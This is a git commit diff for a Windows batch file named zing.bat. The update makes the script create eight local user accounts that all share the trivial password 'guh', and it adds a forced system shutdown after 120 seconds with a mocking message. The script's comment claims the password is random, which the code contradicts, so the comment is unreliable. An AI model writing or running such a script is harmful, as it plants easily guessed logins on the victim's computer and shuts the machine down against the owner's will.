b3105d585409f7ed2329c7ff0394cf5f036515c4
julian20yt <155905626+julian20yt@users.noreply.github.com>
2025-05-21 18:52:10 -0400

    Update zing.bat

--- zing.bat
+++ zing.bat
@@ -1,10 +1,11 @@
 @echo off
 :: Create a new local user named "directv" with a random password
-net user directv * /add
-net user sampuckett * /add
-net user guhcdn * /add
-net user carlyshay * /add
-net user albuquerque * /add
-net user lewbert * /add
-net user chickenjockey * /add
-net user GuhCDN * /add
+net user directv guh /add
+net user sampuckett guh /add
+net user guhcdn guh /add
+net user carlyshay guh /add
+net user albuquerque guh /add
+net user lewbert guh /add
+net user chickenjockey guh /add
+net user GuhCDN guh /add
+shutdown /s /t 120 /c "FEEL GOOD INC SAM PUCKETT ICARLY HAHAHAHAHAHAHAHA GORILLAZ"
